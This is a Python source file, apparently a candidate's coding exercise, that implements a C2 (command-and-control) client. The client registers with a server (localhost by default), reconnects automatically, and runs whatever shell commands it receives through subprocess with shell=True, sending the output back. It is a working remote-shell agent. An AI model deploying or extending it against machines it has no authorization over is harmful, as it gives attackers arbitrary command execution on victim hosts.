"""
C2 Client Implementation
Supports Steps 1-5 with modular design

Author: [Candidate]
References:
- AsyncIO patterns: https://stackoverflow.com/questions/48506460/python-simple-socket-client-server-using-asyncio
- Subprocess execution: https://docs.python.org/3/library/subprocess.html
"""

import asyncio
import logging
import time
import uuid
import argparse
import subprocess
from typing import List
from message import Message
from models.send_receive_msgs import send_message, receive_message
from models.message_type import MessageType
from models.command_type import CommandType

# ==================== CONFIGURATION ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CORE C2 CLIENT LOGIC ====================

class C2Client:
    """Main C2 Client"""
    
    def __init__(self, server_host: str, server_port: int, client_id: str):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = client_id
        self.reader = None
        self.writer = None
        self.running = True
        self.command_queue = asyncio.Queue()
        self.shutdown_event = asyncio.Event()
    
    async def connect(self) -> bool:
        """
        Connect to C2 server and register
        """
        try:
            is_connected = False
            if not self.running:
                return False
            self.reader, self.writer = await asyncio.open_connection(
                self.server_host,
                self.server_port
            )
            logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
            
            # Send registration message
            await send_message(
                self.writer,
                Message.as_register(self.client_id)
            )
            
            # Receive acknowledgment
            msg = await receive_message(self.reader)
            if msg and msg.type is MessageType.ACK:
                logger.info(f"Registered as {msg.client_id}")
                is_connected = True
            else:
                logger.error("Registration failed")
        
        except ConnectionRefusedError:
            logger.error("Connection refused, server possibly down")
        except asyncio.CancelledError:
            logger.info("Connection attempt cancelled")
        except Exception as e:
            logger.error(f"Connection failed: {e}")
        finally:
            return is_connected
    
    async def reconnect_loop(self):
        """
        Auto-reconnect logic
        Attempts to reconnect every 1 second if disconnected
        """
        try:
            reconnect_delay = 1
        
            while self.running:
                if self.reader and self.writer:
                    logger.info('reader/writer exists - no reconnection needed')
                    return
                
                if await self.connect():
                    logger.info(f"Connected successfully {self.client_id}")
                    return
                
                logger.info(f"Attempting to reconnect in {reconnect_delay}s...")
                await asyncio.sleep(reconnect_delay)
            
        except asyncio.CancelledError:
            logger.info("Reconnect loop cancelled")
        except Exception as e:
            logger.error(f"Reconnect loop error: {e}")
    
    async def main_loop(self):
        """
        Main client loop
        """
        self.shutdown_event.clear()
        tasks = [
            asyncio.create_task(self._command_listener()),
            asyncio.create_task(self._command_processor()),
        ]
        tasks.append(
            asyncio.create_task(self._monitor(tasks))
        )
        
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            logger.info("Client main loop cancelled")
        finally:
            logger.info("Client canceling tasks")
            await self._cancel_tasks(tasks)
            # Clear connection state
            await self._reset_writer_reader()

    async def _reset_writer_reader(self):
        if self.writer and not self.writer.is_closing():
            self.writer.close()
            await self.writer.wait_closed()
        self.reader = None
        self.writer = None

    async def _monitor(self, tasks: List[asyncio.Task]):
        """
        Monitor connection health
        """
        try:
            await self.shutdown_event.wait()
            if not self.running:
                logger.info("Monitor caught termination event triggered")
            else:
                logger.info("Monitor caught reconnection event triggered")
            
        except asyncio.CancelledError:
            logger.info("Monitor cancelled")
        except Exception as e:
            logger.error(f"Monitor error: {e}")
        finally:
            await self._cancel_tasks(tasks)

    @staticmethod
    async def _cancel_tasks(tasks: List[asyncio.Task]):
        try:
            for task in tasks:
                if not task.done():
                    task.cancel()
        except Exception as e:
            logger.error(f"Error cancelling tasks: {e}")
    
    async def _command_listener(self):
        """
        Listen for incoming commands from server
        """
        try:
            while self.running:
                logger.info("Listening for command")
                msg = await receive_message(self.reader)

                # Connection closed
                if not msg:
                    if not self.running:
                        logger.info("Client closed connection")
                    else:
                        logger.info("Server closed connection")
                    self.shutdown_event.set()
                    break
                
                if msg.type is MessageType.COMMAND:
                    # Queue command for execution
                    await self.command_queue.put({
                        "cmd_id": msg.cmd_id,
                        "command": msg.command
                    })
                    logger.info(f"Received command: {msg.command}")
                else:
                    logger.warning(f"Unknown message type: {msg.type}")
        
        except asyncio.CancelledError:
            logger.info('command_listener cancelled')
        except Exception as e:
            logger.error(f"Command listener error: {e}")
    
    async def _command_processor(self):
        """
        Execute commands from queue
        """
        try:
            loop = asyncio.get_event_loop()
            while self.running:
                # Get command with timeout
                # cmd_data = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
                cmd_data = await self.command_queue.get()
                
                cmd_id = cmd_data.get("cmd_id")
                command = cmd_data.get("command").lower()
                
                logger.info(f"Executing: {command}")
                
                start_time = time.time()
                
                if command == CommandType.KILL.value:
                    logger.info("Kill command received, exiting")
                    result = "Client killed by server"
                    self.running = False
                    # Close reader to stop listener from reading
                    if self.reader:
                        self.reader.feed_eof()
                
                else:
                    # Run command asynchronously in thread pool
                    result = await loop.run_in_executor(
                        None,
                        self._execute_bash_command,
                        command
                    )
                
                exec_time_ms = (time.time() - start_time) * 1000
                
                # Send result back to server
                success = await send_message(
                    self.writer,
                    Message.as_result(cmd_id, result, exec_time_ms)
                )
                if success:
                    logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
                else:
                    logger.debug("Failed to send result - connection lost")
                    break
                
                # Exit after sending kill result
                if not self.running:
                    return
            
        except asyncio.CancelledError:
            logger.info('command_processor cancelled')
        except Exception as e:
            logger.error(f"Command processor error: {e}")

    def _execute_bash_command(self, command: str) -> str:
        """
        Execute bash-style command
        Supports pipes, redirects, etc.
        """
        try:
            # Use shell=True to support pipes, redirects
            # WARNING: this is a security risk in production
            # For testing/exercise, it's acceptable
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=30,
                text=True
            )
            
            # Combine stdout and stderr
            output = result.stdout
            if result.stderr:
                output += f"\n[stderr] {result.stderr}"
            
            return output if output else "[No output]"
        
        except subprocess.TimeoutExpired:
            return "[Command timed out after 30s]"
        except Exception as e:
            return f"[Error: {str(e)}]"
    
    async def start(self):
        """Start the C2 client"""
        logger.info(f"Starting C2 client (ID: {self.client_id})")
        
        # Start with reconnect loop - it handles both initial connection and reconnections
        while self.running:
            await self.reconnect_loop()
            if self.reader and self.writer:
                await self.main_loop()

# ==================== MAIN ====================

async def main():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server-host", default="127.0.0.1", help="Server host")
    parser.add_argument("--server-port", type=int, default=5000, help="Server port")
    parser.add_argument("--client-id", default=None, help="Client ID (auto-generated if not provided)")

    args = parser.parse_args()

    # Generate client ID if not provided
    client_id = args.client_id or f"client-{uuid.uuid4().hex[:8]}"
    
    client = C2Client(args.server_host, args.server_port, client_id)
    
    try:
        await client.start()
    except KeyboardInterrupt:
        logger.info("Client shutdown")
        client.running = False

if __name__ == "__main__":
    asyncio.run(main())